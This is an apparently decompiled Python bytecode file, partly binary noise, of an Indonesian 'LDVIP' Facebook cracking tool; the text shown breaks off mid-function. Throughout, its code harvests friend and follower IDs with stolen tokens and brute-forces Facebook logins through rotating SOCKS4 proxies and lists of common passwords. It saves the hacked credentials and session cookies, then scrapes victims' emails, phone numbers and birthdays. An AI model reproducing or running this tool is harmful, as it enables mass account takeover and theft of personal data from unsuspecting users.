o
    +��b�  �                   @   sH  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlmZ d dlmZ d dlmZ dd� Ze�  e�� ZejZg d�Zzed k saedkrde�  ed	 ZW n eyu   e�  Y nw d d
lmZ d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZzd dlZW n' ey�   e�d� e�d	� zd dlZW n ey�   ed� Y nw Y nw d dl m!Z" d dl#m$Z% d dlmZ& d dlmZ' d dl#m(Z) d dl*m+Z, d dlm-Z. d dl/m0Z1 d dl2m3Z4 d dlm5Z6 g Z7g Z8ze �9d�j:Z;e<dd��=e;� W n e>�y5 Z? z
ee?� W Y dZ?[?ndZ?[?ww e@d�D ]�ZAdZBe�Cd	d�ZDe�Cd	d�ZEdZFe�Cdd�Z?dZGe�Cd	d�ZHe�Cd	d�ZIe�Cd	d�ZJe�Cd	d�ZKd ZLeB� eD� d!eE� d"eF� e?� eG� eH� d!eI� d!eJ� d!eK� d"eL� �ZMe7�NeM� d#ZOe�5g d$��ZDd%ZEe�5g d&��ZFe�Cd	d'�Z?e�5g d&��ZGd(ZHe�Cd)d�ZId*ZJe�Cd+d,�ZKe�Cd-d.�ZLd/ZPeO� d"eD� d0eE� eF� e?� eG� d1eH� eI� d!eJ� d!eK� d!eL� d"eP� �ZQe8�NeQ� �q:g g d d d g g g g g g g f\ZRZSaTaUaVZWZXZYZZZ[Z\Z]d2gZ^g Z_g g Z`Zad3d4� Zbd5Zcd6ZLd7ZId8Zdd9Zed:Zfd;ZDd<Zgd=d>d?d@dAdBdCdDdEdFdGdHdI�Zhd=d>d?d@dAdBdCdDdEdFdGdHdJ�Ziej�� jjZkehelej�� j� Zmej�� jnZodKelek� dL elem� dL eleo� dM ZpdNelek� dL elem� dL eleo� dM Zqe �9dO��� Zrg Z_e �s� Ztg Zuz
erdP ZverdQ ZwW n ex�y�   d"Zvd"ZwY nw dRdS� ZydTdU� ZzdVdW� Z{dXdY� Z|dZd[� Z}d\d]� Z~d^d_� Zd`da� Z�dbdc� Z�ddde� Z�dfdg� Z�dhdi� Z�djdk� Z�dldm� Z�dndo� Z�dpdq� Z�drds� Z�dtdu� Z�dvdw� Z�dxdy� Z�dzd{� Z�e�d|k�r"ze��d}� W n   Y ze��d~� W n   Y e��  dS dS )�    N)�ThreadPoolExecutor)�datetime)�BeautifulSoupc                  C   s�   t t�� �t t�� � } d�| �}td| � z1t�d�j}||v r4td� t t�� �}t	�
d� W d S td� t�d� t	�
d� t��  W d S    t��  td	kr^tt� t�  Y d S Y d S )
N�-z[37;1mYOUR ID : zhttps://pastebin.com/7MHy9yFkz[1;92mYOUR ID IS ACTIVE...!g333333�?z,[1;91mID ACTIVATE (telegram) INBOX  @FFRFF3zxdg-open https://t.me/FFRFF3�   �__main__)�str�os�geteuid�getlogin�join�print�requests�get�text�time�sleep�system�sys�exit�nameZlogo�xoshnaw)�uuid�idZhttpCaht�msg� r   �/sdcard/Download/fb.pyr      s(   



�r   )ZJANZFEBZMARZAPRZMAYZJUNZJULZAUGZSEPZOCTZNOVZDEC�   r   )�tokenzpip install richzKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�Group)�Panel)r   )�Markdown)�Columns)�choicezwhttps://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=allz
.proxy.txt�wi'  z!Mozilla/5.0 (Symbian/3; Series60/�	   ZNokia�d   i'  zl/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/�   zMobile Safari/535.1�.� zMozilla/5.0 (Linux; U; Android)�6�7�8�9�10�11�12z en-us; GT-)�A�B�C�D�E�F�G�H�I�J�K�L�M�N�O�P�Q�R�S�T�U�V�W�X�Y�Zi�  z.AppleWebKit/537.36 (KHTML, like Gecko) Chrome/�I   �0ih  i$  �(   �   zMobile Safari/537.36z; z) �suksesc                  C   s0   zt d��� } t�| � W d S    t�  Y d S )N�.cookie.txt)�open�read�cokbrut�append�login_lagi334)Zcokbrur   r   r   �cocokj   s
   rX   z[mz[93mz[1;92mz[32mz[95mz[33mz[1;96mz[0;34mZJanuariZFebruariZMaretZAprilZMeiZJuniZJuliZAgustusZ	SeptemberZOktoberZNovemberZDesember)�1�2�3�4�5r,   r-   r.   r/   r0   r1   r2   )�01�02�03�04�05�06�07�08�09r0   r1   r2   zOK-r   z.txtzCP-zhttp://ip-api.com/json/�queryZcountryc                 C   s6   | d D ]}t j�|� t j��  tt�d�f qd S )N�
g���Q��?)r   �stdout�write�flushr   r   )�nZsirr   r   r   �jalan�   s
   
�rm   c                   C   s   t �d� d S )N�clear)r	   r   r   r   r   r   rn   �   s   rn   c                   C   s
   t �  d S )N)�loginr   r   r   r   �back�   s   
rp   c                  C   s^   t �  d} t| dd�}t� �|� tttttt	g�}|� d�}t
|dd�}tt
|dd�� d S )Nz# TOOLS CRACKED BY LDVIP�cyan��styleu'  
                              • version  : V1.0
	
                                                                  
LL      DDDDD   VV     VV IIIII PPPPPP     
LL      DD  DD  VV     VV  III  PP   PP    
LL      DD   DD  VV   VV   III  PPPPPP     
LL      DD   DD   VV VV    III  PP         
LLLLLLL DDDDDD     VVV    IIIII PP         
                                                                          
███████████████████████████████████████████████  • facebook : https://m.me/Alikr93
█▄─▄▄─██▀▄─██─▄▄▄─█▄─▄▄─█▄─▄─▀█─▄▄─█─▄▄─█▄─█─▄█  • author : LDVIP
██─▄████─▀─██─███▀██─▄█▀██─▄─▀█─██─█─██─██─▄▀██  • T.ME : @FFRFF3
▀▄▄▄▀▀▀▄▄▀▄▄▀▄▄▄▄▄▀▄▄▄▄▄▀▄▄▄▄▀▀▄▄▄▄▀▄▄▄▄▀▄▄▀▄▄▀  
 �redZLDVIP��title)rn   �mark�solr   �pilih�h�b�p�hh�kk�nel�cetak)ZwelZwel2Zxxnx�auZpengembang1r   r   r   �banner�   s   
r�   c                  C   s�   dt v rpt�  z[tdd��� } t�| � z(tjdtd  dtd id�}t	�
|j�d }t	�
|j�d	 }t||� W W d S  tyH   t�  Y n tjjy\   t�  td
� t�  Y nw W d S W d S  tyo   t�  Y d S w 	 d S )NrQ   �
.token.txt�r�:https://graph.facebook.com/me?fields=id,name&access_token=r   �cookie��cookiesr   r   z INTERNET ERROR )�	lisensikurX   rS   rT   �tokenkurV   r   r   rU   �json�loadsr   �menu�KeyErrorrW   �
exceptions�ConnectionErrorr�   r   r   �IOError)r   �syZsy2Zsy3r   r   r   ro   �   s.   


���ro   c               
   C   s  t �  td� d} | dv r�zWtd�}tdd��|� ddi}tjd	|d
|id�}t�d|j	�}tdd��|�
d��}tdd��� }tdd��� }tjd| d
|id�}t�|j	�d }	td� t�  W d S  ty� }
 zt�d� t�d� td� t�  W Y d }
~
d S d }
~
ww 	 d S )Nz 1 . LOGIN COOKIESrY   �rY   r^   z Masukan Cookies : rR   r&   �
User-Agent�LMozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.0z0https://business.facebook.com/business_locationsr�   )�headersr�   z	(EAAG\w+)r�   r   r�   r�   r�   r   zLogin sukses�rm -rf .token.txtzrm -rf .cookie.txtzTOKEN MOKAD)r�   r   �inputrS   rj   r   r   �re�searchr   �grouprT   r�   r�   ro   �	Exceptionr	   r   r   )�pilZcooki�head�dataZ
find_tokenZkenZcokromZtokromZtesZtes3�er   r   r   rW   �   s2   

��rW   c           
      C   s�  z	t �d��� }W n   ddi}Y t�  d}t|dd�}t� �|� ttd t d t d	 t	| � � ttd t d t d
 t	|� � ttd t d t d t	|d � � d}t
|dd�}tt
|dd�� ttd t d t d �}|dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�  d S |dv r�t�d� ttd t d t d � t�d� d}t� �t|dd�� t�  d S d}	t� �t|	dd�� t�  d S )Nzhttps://httpbin.org/ip�originr   z# INFORMASI PENGGUNA�greenrr   �[�   •z] [93mNama User        : z] [93mIni IDs User     : z] [93mIp Device        : z�[37;1m[01] Ambil ID Dari Pengikut
[37;1m[02] Ambil ID Dari Pertemanan Publik
[37;1m[03] Ambil ID Dari Akun Publik (bebas) 
[37;1m[04] Cek Hasil Crack
[37;1m[05] Lihat Opsi Checkpoint
[37;1m[00] Keluarrt   zPILIHAN MENUru   �
] Pilih : r�   �rZ   r_   �r[   r`   )r\   ra   )r]   rb   �rN   Z00r�   z] Tunggu ...r   u$   # BELUM 2 RONDE UDAH KELUAR AJA 😂z# PILIH YANG BENER LAH KONTOL)r   r   r�   r�   rw   rx   r   �xrz   r   r   r�   r�   r|   �dump_follower�dump_publik�dump_massal�result�filer	   r   r   r   r   )
Zmy_nameZmy_id�shZsgZfx�ioZoiZjh�sw�ricr   r   r   r�   �   sB   $$(








r�   c               	   C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv �r�zt�	d�}W n t
yS   d}t � �t|dd�� t�d� t�  Y nw t|�dkrpd}t � �t|dd�� t�d� t�  d S d}t � �t|dd�� d}i }	|D ]o}
ztd|
 d��� }W n   Y q�|d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y+   d}t � �t|dd�� t�  Y nw ztd| d��� }W n   d}t � �t|dd�� t�d� t�  Y d}t � �t|dd�� t�d| �}d}t � �t|dd�� ttd t d  t d! � t�  d S |d"v �r�zt�	d#�}W n t
�y�   d}t � �t|dd�� t�d� t�  Y nw t|�dk�r�d$}t � �t|dd�� t�d� t�  d S d%}t � �t|dd�� d}i }	|D ]s}
ztd&|
 d��� }W n   Y �q�|d7 }|d'k �r+dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt|�� d t � �q�|	�t|�t|
�i� tdt|� d |
 d tt|�� d t � �q�d}t � �t|dd�� ttd t d	 t d
 �}z|	| }W n t�y�   d}t � �t|dd�� t�  Y nw ztd&| d��� }W n   d}t � �t|dd�� t�d� t�  Y d(}t � �t|dd�� t�d)| �}d(}t � �t|dd�� ttd t d  t d! � t�  d S |d*v �r�t�  d S d}t � �t|dd�� t�  d S )+Nz# CEK RESULT CRACKr�   rr   z8[01] Cek Hasil Cp
[02] Cek Hasil Ok
[00] Kembali Ke Menu�yellowZRESULTSru   r�   �fr�   r�   �CPz# DIREKTORI TIDAK DITEMUKANrt   �   r   z# ANDA BELUM MEMILIKI RESULT CPz# HASIL CP ANDA�CP/r�   r   �
   rN   �] � ---> � Akunz # PILIH RESULT UNTUK DITAMPILKAN�# PILIHAN TIDAK ADA DI MENU�+# FILE TIDAK DITEMUKAN, PERIKSA & COBA LAGIz# LIST AKUN CP ANDAzcd CP && cat r�   z	] Kembalir�   �OKz# ANDA BELUM MEMILIKI RESULT OKz# HASIL OK ANDA�OK/r(   z# LIST AKUN OK ANDAzcd OK && cat r�   )rx   r   rw   r   r�   r�   r�   r|   r	   �listdir�FileNotFoundErrorr   r   rp   �lenrS   �	readlinesr   �updater�   r   rT   r   rz   )�cekZkayesZkisZkzZvinZgadaZhahaZgerr�cih�lol�isi�hem�nomZgerr2�geeh�gehr�   Zlin�hehe�akunZhusZakun2r   r   r   r�   	  s�   


�


.2
�




�


04
�




r�   c                  C   s4  d} t � jt| dd�dd� ttd t d t d � t�d� d	}t � �t|d
d�� g }zt�d�}|D ]}|�	|� q7W n   Y zt�d�}|D ]}|�	|� qMW n   Y t
|�dkrrd}t � �t|dd�� t�  d S d}i }	|D ]�}
ztd|
 d��� }W n   ztd|
 d��� }W n   Y Y qxY |d7 }|dk r�dt|� }|	�t|�t|
�i� |	�|t|
�i� td| d |
 d tt
|�� d t � qx|	�t|�t|
�i� tdt|� d |
 d tt
|�� d t � qxd	}t � �t|d
d�� ttd t d t d �}z|	| }W n t�y2   d}t � �t|dd�� t�  Y nw ztd| d��� }|D ]}t�	|�dd�� �q?t�  W d S  t�y�   ztd| d��� }|D ]}t�	|�dd�� �qet�  W Y d S  t�y�   d}t � �t|dd�� t�d� t�  Y Y d S w w )Nz# CEK OPSI DARI FILErq   rr   zon redr�   r�   z*] Sedang Membaca File, Tunggu Sebentar ...r�   z# PILIH FILE YG AKAN DI CEKr�   r�   r�   r   z(# ANDA BELUM MEMILIKI RESULT UNTUK DICEKrt   r�   r�   r�   r   r�   rN   r�   r�   r�   r�   r�   r�   rh   � r�   )rx   r   rw   r�   rz   r   r   r	   r�   rV   r�   r   rS   r�   r   r�   r�   r|   r�   r�   �replace�cek_opsir�   rp   )Ztek�teksZmy_filesZlisZktZmer�ty�yyr�   r�   r�   r�   r�   �teks2r�   r�   r�   ZhfZfzr�   r   r   r   r�   |  s�   

�
�
�.2
�
��r�   c            
   	   C   s�  z	t dd��� } W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d � t	td t
 d	 t d
 �}zLtjd| d td  dtd id��� }|d d D ]}zt�|d d |d  � W q\   Y q\ttd t d t d ttt�� � t�  W d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}t|dd�}	t� �|	� t�  Y d S w )Nr�   r�   z# DUMP PUBLIC IDr�   rr   r�   r�   z1] TYPE "me" IF YOU WANT TO DUMP FROM YOUR FRIENDSr�   z] INPUT TARGET ID : � https://graph.facebook.com/v1.0/z)?fields=friends.limit(5000)&access_token=r   r�   r�   �friendsr�   r   �|r   z
] TOTAL : z2# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAINrt   rq   z'# NOT PUBLIC FRIENDSHIP OR BROKEN TOKEN)rS   rT   r�   r   rw   rx   r   r�   rz   r�   r|   r   r   r�   rU   r�   r   rV   r   r�   �settingr�   r�   r�   �
r   �winZwin2r�   �koh2�pi�li�lor�   r�   r   r   r   r�   �  s8   
�* 
(�r�   c            
   	   C   s�  z	t dd��� } W n ty   t�  Y nw d}t|dd�}t� �|� ttd t d t d � t	td t
 d	 t d
 �}zFt�d| d td  ��� }|d d D ]}zt�|d d |d  � W qV   Y qVttd t d t d ttt�� � t�  W d S  tjjy�   d}t|dd�}t� j|dd� t�  Y d S  ttfy�   d}t|dd�}	t� �|	� t�  Y d S w )Nr�   r�   z# DUMP ID FOLLOWERSr�   rr   r�   r�   z*] Ketik "me" Jika Ingin Dump ID Dari Temanr�   z] Masukkan ID Target : zhttps://graph.facebook.com/z'/subscribers?limit(10000)&access_token=r   �pagingr�   r   r�   r   z
] Total : �2# KONEKSI INTERNET BERMASALAH, PERIKSA & COBA LAGIrt   rq   z*# PERTEMANAN TIDAK PUBLIK ATAU TOKEN RUSAK)rS   rT   r�   r   rw   rx   r   r�   rz   r�   r|   r   r   r�   r�   r   rV   r   r�   r�   r�   r�   r�   r�   r   r   r   r�   �  s8   
� 
(�r�   c                  C   s*  t d� zttd��} W n ty   t d� t�  Y nw | dk s%| dkr,t d� t�  t��  d}t d� t| �D ]!}|d7 }ttd	 t	 t
|� t d
 t
|� d �}t�|� q:d}t� � t|dd�� tD ]}t|� qjdtt� }tt�dkr�t|dd�}nt|dd�}t� � |� t�  d S )Nz MAU BERAPA ID ? LIMIT [20 ID]z MASUKAN ID : z ID TIDAK PUBLIK r   �   �ERRORr   z' JIKA INGIN CRACK AKUN TUMBAL KETIK me r�   z] Enter The zId : z# WAIT COLLECTING IDr�   rr   z# SUCCESSFUL COLLECTING  %s IDrt   )r   �intr�   �
ValueErrorr   r   �Session�ranger�   rz   r   �uidrV   rx   rw   �dumpdumpr�   r   r�   )ZjumZyz�met�klZsedZuserrZtotZtot2r   r   r   r�   �  s6   
�,

r�   c              	   C   s0  zlddi}t jd|  d td  dtd i|d��� }z|d d	 d
 d }W n   Y |d d D ]7}z|d d |d  d |d  }|tv rJnt�|� W q2   |d d |d  }|tv rcnt�|� Y q2W d S  t jjy�   d}t	|dd�}t
� j|dd� td� Y d S  ttfy�   Y d S w )Nr�   r�   r�   z2?fields=friends.limit(5000){id,name}&access_token=r   r�   �r�   r�   r�   r�   Zcursors�beforer�   r   r�   r   Zbirthdayz5# PROBLEM INTERNET CONNECTION,PRESS ENTER TO CONTINUErt   rr   rq   r�   )r   r   r�   rU   r�   r   rV   r�   r�   rw   rx   r   r�   r�   r�   )r�   r�   r�   Zkoher�   Zisor�   r�   r   r   r   r�     s6   , 

�

�
�r�   c                  C   s^   t �  ztd�} t| d��� D ]	}t�|�� � qt�  W d S  ty.   t	d|  � Y d S w )Nz
 [+] Enter file path : r�   z
 [!] file %s not found)
r�   r�   rS   r�   r   rV   �stripr�   r�   r   )ZfileX�liner   r   r   �File.  s   �r�   c                  C   s�  d} t � �t| dd�� d}t|dd�}tt|dd�� ttd t d	 t d
 �}|dv r9tD ]}t	�
|� q0n7|dv rItD ]}t	�d|� q?n'|dv ratD ]}t�dtt	��}t	�||� qOnd}t � �t|dd�� t�  d}t � �t|dd�� d}t|dd�}	tt|	dd�� ttd t d	 t d
 �}
|
dv r�t�
d� n|
dv r�t�
d� nt�
d� d}t � �t|dd�� ttd t d	 t d �}|dv r�t�
d� nt�
d� ttd t d	 t d �}|dv r�t�
d� nt�
d� t�  d S )Nz# SETTING URUTAN IDr�   rr   zo[37;1m[01] Crack Dari Akun Tertua []
[37;1m[02] Crack Dari Akun Termuda []
[37;1m[03] Acak Urutan ID[]ZblueZSETTINGru   r�   r�   r�   r�   r�   r   r�   r�   rt   z# PILIH METHOD CRACKZpinkzc[37;1m[01] Method B-Api []
[37;1m[02] Method Mobile []
[37;1m[03] Methode Free Facebook []r�   ZMETHOD�api�free�mobilez# PILIHAN OPSI CRACK z'] Tampilkan Aplikasi Tertaut ? (y/t) : ��yrK   �ya�noz:] Tampilkan Opsi Checkpoint ? [ Not Recommended ] (y/t) : )rx   r   rw   r   r�   r�   r�   r|   r   �id2rV   �insert�random�randintr�   r   �method�	taplikasi�oprek�passwrd)Zwlr�   Ztak�huZbacot�xxr�   r�   ZiozZgessZhcZguwZaplikZoskr   r   r   r�   9  sX   ���



r�   c            
      C   s�  d} t � �t| dd�� dttf }tt|dd�� tdd���}tD ]�}|�	d	�d
 |�	d	�d �
� }}|�	d�d
 }g d�}t|�dk r�t|�dk rMn�|�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�|d � nOt|�dk r�|�|� nC|�|� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�d� |�|d � dtv r�|�t||� q"dtv r�|�t||� q"dtv r�|�t||� q"|�t||� q"W d   � n	1 �sw   Y  td� d }t � �t|dd�� ttd! t d" t d# �}	|	d$v �r?t�  d S t�  d S )%Nz5# PROSES CRAKER BERJALAN, TEKAN CTRL+Z UNTUK BERHENTIr�   rr   zlHasil Live  Disimpan Ke : OK/%s
Hasil Check Disimpan Ke : CP/%s
Hidupkan/Matikan Mode Pesawat Setiap 5 MenitZCRACKru   �   )Zmax_workersr�   r   r   r+   )ZsayangZsayangkuZ	sayang123Z	bismillah�   �   Z
1234512345Z19981998Z19901990Z19961996Z19951995Z	200220002Z12345678900Z19991999Z
1122334455Z20002000Z19971997Z12345r�   r�   r�   r�   z## INGIN MENGECEK OPSI HASIL CRACK ?r�   r�   z.] Ingin Menampilkan Opsi Hasil Crack? (y/t) : r�   )rx   r   rw   �okc�cpcr�   r   �tredr�   �split�lowerr�   rV   r�   �submit�crack�crack2�crack3r�   r�   r|   r�   r   )
ZlerZkrek�poolZyuzong�idfZnmfZfrs�pwvZtanyaZwoir   r   r   r�   i  sn   "






















��.


r�   c           0      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]}�z�t�� }	|�� }t �t�}
dd|
 i}|j�dd	|d
d	ddddddddd�� |�d�j}t� dt|���!d�t� dt|���!d�| d|dd�}|j�ddd	dd|d
ddddddddd�� |j"d|d d!�}d"|j#�$� �%� v �rd#t&v r�t'�(| d$ | � t)| |� n7td%� d&| � d'|� �}t*|d(d)�}t+t*|d*d+�� t,d,t- d-��.| d$ | d% � t'�(| d$ | � td7 aW  �nNd.|j#�$� �%� v �r<d/d0i}d1t/v �rctd7 a|j#�$� }d2�0d3d4� |j#�$� �1� D ��}t,d5t2 d-��.| d$ | d$ | d% � td%� d&| � d6|� d7|� �}t*|d8d)�}t+t*|d9d+�� W  �n�d#t/v �r;td7 a|j#�$� }d2�0d:d4� |j#�$� �1� D ��}t,d5t2 d-��.| d$ | d$ | d% � | }d;}t�� }|jd<||d=�j}t�3d>t|��d? }|jd@||d=�j}|jdA||d=�j}|jd|� dB�||d=�j}|jdC|� dD�||d=�j}zt�3dEt|��d? }W n   d;}Y zt�3dFt|��d? �4dGdH�} W n   d;} Y zt�3dIt|��d? }!W n   d;}!Y zt�3dJt|��d? }"W n   d;}"Y zt�3dKt|��d }#W n   d;}#Y zd;}$t�3dLt|��}%|%D ]	}&|$|&dM 7 }$�qKW n   Y |dN|� dO|"� dP|#� dQ| � dR|� dS|$� dT|!� d%�7 }dU\}'}(|jdV||d=�j})|jdW||d=�j}*dXt�3d>t|)��v �r|dY7 }dZ|)v �r�|d[7 }n2|d\7 }t�3d]t|)��}+t�3d^t|)��},|+D ]}-|'d7 }'|d_|'� d`|-� d|,|( � d%�7 }|(d7 }(�q�da|*v �r�|db7 }n8dU\}'}(|dc7 }t�3d]t|*��}.t�3d^t|*��}/|.D ]}-|'d7 }'|d_|'� d`|-� d|/|( � d%�7 }|(d7 }(�q�n	 td%� d&| � d6|� d7|� d%|� �}t*|d8d)�}t+t*|ddd+�� W  nnW q@W q@ tj5j6�yP   t�7de� Y q@w td7 ad S )fNr(   �%z:%s+> [ LDVIP ] %s/%s >>>> OK:%s >>>> CP:%s >>>> %s%s%sr+   ��end�httpz	socks4://�mbasic.facebook.comrY   ��text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9�mark.via.gp�same-origin�cors�empty�document�https://mbasic.facebook.com/�gzip, deflate br�en-GB,en-US;q=0.9,en;q=0.8��Host�upgrade-insecure-requests�
user-agent�acceptZdnt�x-requested-with�sec-fetch-site�sec-fetch-mode�sec-fetch-user�sec-fetch-dest�referer�accept-encoding�accept-languagezqhttps://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F�name="lsd" value="(.*?)"r   �name="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)�lsd�jazoestr�   Zflow�pass�next�	max-age=0�https://mbasic.facebook.com�!application/x-www-form-urlencoded�r   �cache-controlr!  r�   �content-typer"  r#  r$  r%  r&  r'  r(  r)  r*  r+  zHhttps://mbasic.facebook.com/login/device-based/validate-password/?shbl=0F�r�   �allow_redirects�
checkpointr�   r�   rh   �   [•] ID       : �    [•] PASSWORD : rt   rr   r�   ru   r�   �a�c_userr"  z�Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/11.1 Chrome/75.0.3770.143 Mobile Safari/537.36r�   �;c                 S   �   g | ]
\}}d ||f �qS �z%s=%sr   ��.0�key�valuer   r   r   �
<listcomp>�  �    zcrack.<locals>.<listcomp>r�   �   
[•] PASSWORD : �   
[•] COOKIES  : r�   z	STATUS OKc                 S   r@  rA  r   rB  r   r   r   rF  �  rG  r�   �'https://mbasic.facebook.com/profile.phpr�   �\<title\>(.*?)<\/title\>r   �.https://mbasic.facebook.com/profile.php?v=info�1https://mbasic.facebook.com/profile.php?v=friends��/allactivity/?category_key=all&section_id=year_2022&timestart=1609488000&timeend=1641023999&sectionLoadingID=m_timeline_loading_div_1641023999_1609488000_8_�Fhttps://mbasic.facebook.com/timeline/app_collection/?collection_token=�#%3A184985071538002%3A32&_rdc=1&_rdr�=\<a\ href\="tel\:\+.*?">\<span\ dir\="ltr">(.*?)<\/span><\/a>�W\<a href\="https\:\/\/lm\.facebook\.com\/l\.php\?u\=mail.*?" target\=".*?"\>(.*?)<\/a\>�&#064;�@�h\<\/td\>\<td\ valign\="top" class\=".*?"\>\<div\ class\=".*?"\>(\d+\s+\w+\s+\d+)<\/div\>\<\/td\>\<\/tr\>�+\<h3\ class\=".*?"\>Teman\ \((.*?)\)<\/h3\>�%\<span\ class\=".*?"\>(.*?)\<\/span\>�%\<div\ class\=".*?" id\="year_(.*?)">�, �   [✓] Nama Akun       : �   
[✓] Jumlah Teman    : �   
[✓] Jumlah Pengikut : �   
[✓] Email Aktif     : �   
[✓] Nomor Aktif     : �   
[✓] Tahun Akun      : �   
[✓] Tanggal Lahir   : �r   r   �<https://mbasic.facebook.com/settings/apps/tabbed/?tab=active�>https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive�Diakses menggunakan Facebook�Aplikasi Yang Terkait*
�AAnda tidak memiliki aplikasi atau situs web aktif untuk ditinjau.�(Tidak Ada Aplikasi Aktif Yang Terkait *
�	Aplikasi Aktif : 
�;\/><div\ class\=".*?"\>\<span\ class\=".*?"\>(.*?)<\/span\>�2\<div\>\<\/div\>\<div\ class\=".*?"\>(.*?)<\/div\>�		[r�   �FAnda tidak memiliki aplikasi atau situs web kedaluwarsa untuk ditinjau�-
Tidak Ada Aplikasi Kedaluwarsa Yang Terkait
�	Aplikasi Kedaluwarsa :
r�   �   )8r�   r%   �u�kr~   r{   rz   r}   �loopr�   r�   r   �ok�cpr�   r   r�   r   ri   rk   �ugen�ugen2r   r�   r   r	  �proxr�   r�   r   r   r�   r�   r�   �postr�   �get_dict�keysr�   r�   rV   �cekerr   r�   rS   r  rj   r�   r   �itemsr  �findallr�   r�   r�   r   )0r  r  �bi�pers�fff�ua�ua2�ses�pw�tixZnipZproxsr|   �dataa�po�statuscp�	statuscp1Zheadapp�coki�kuki�statusok�	statusok1�user�infoakun�session�get_id�nama�response�	response2�	response3�	response4�nomer�email�ttl�teman�pengikut�tahun�cek_thn�nenen�hit1�hit2r�   �cek2�apkAktif�ditambahkan�muncul�apkKadaluarsa�
kadaluarsar   r   r   r  �  s�   6



(6, 

(

("�4

 

 ��D�E�r  c           
   
   C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t��dd�}t�� }|D ]�}z�tt �dd	��tt �d
d��tt �d
d��dd|ddd�}|jdt| � d t|� d |d�}	d|	�� d v r�dtv r�t�| d | � t| |� n&tdt| |f � tdt  d��!| d | d � t�| d | � td7 aW  n<d|	j"v r�d|	j"v r�tdt| |f � td t# d��!| d | d � td7 aW  nW q? tj$j%y�   t&�'d!� Y q?w td7 ad S )"Nr(   r  z<%s-+> [ Prosesing ] %s/%s ---> ok*%s ---> cp*%s ---> %s%s%sr+   r  rh   r�   g    �sAg    8�|Ai N  i@�  Z	EXCELLENTz!cell.CTRadioAccessTechnologyHSDPAr4  ZLiger)zx-fb-connection-bandwidthzx-fb-sim-hnizx-fb-net-hnizx-fb-connection-qualityzx-fb-connection-typer"  r7  zx-fb-http-enginez?https://b-api.facebook.com/method/auth.login?format=json&email=z
&password=a�  &credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true)r�   zwww.facebook.comZ	error_msgr�   r�   z%s++++ %s|%s ----> CP       r�   r=  r   Zsession_keyZEAAAz%s++++ %s|%s ----> OK       r�   ro  )(r�   r%   rp  rq  r~   r{   rz   r}   rr  r�   r�   r   rs  rt  r�   r   r�   r   ri   rk   ru  r�   r   r�   r�   r   r�   r�   r�   rV   r{  rS   r  rj   r   r  r�   r�   r   r   )
r  r  r~  r  r�  r�  r�  r�  r�   �respr   r   r   r    s:   6:&  �r  c           -      C   s�  t �ttttttg�}td t	t
� }d}td|tt	t
�ttt|�t|�tf dd� tj��  t �t�}t �t�}t�� }|D �]
}�z�t�� }	|j�dd|ddd	d
ddddddd�� |�d|  �j}
t�dt|
���d�t�dt|
���d�t�dt|
���d�t�dt|
���d�| |d�}|j�ddddd|dd
dddd|  ddd�� |j d|dd�}d |j!�"� �#� v �r	d!t$v r�t%�&| d" | � t'| |� n7td#� d$| � d%|� �}t(|d&d'�}t)t(|d(d)�� t*d*t+ d+��,| d" | d# � t%�&| d" | � td7 aW  �nCd,|j!�"� �#� v �r7d-t-v �retd7 a|j!�"� }d.�.d/d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � td#� d2| � d3|� d4|� �}t(|d5d'�}t)t(|d6d)�� W  �n�d!t-v �r6td7 a|j!�"� }d.�.d7d0� |j!�"� �/� D ��}t*d1t0 d+��,| d" | d" | d# � | }d8}t�� }|jd9|d:�j}t�1d;t|��d< }|jd=|d:�j}|jd>|d:�j}|jd|� d?�|d:�j}|jd@|� dA�|d:�j}zt�1dBt|��d< }W n   d8}Y zt�1dCt|��d< �2dDdE�}W n   d8}Y zt�1dFt|��d< }W n   d8}Y zt�1dGt|��d< }W n   d8}Y zt�1dHt|��d } W n   d8} Y zd8}!t�1dIt|��}"|"D ]	}#|!|#dJ 7 }!�qHW n   Y |dK|� dL|� dM| � dN|� dO|� dP|!� dQ|� d#�7 }dR\}$}%|jdS|d:�j}&|jdT|d:�j}'dUt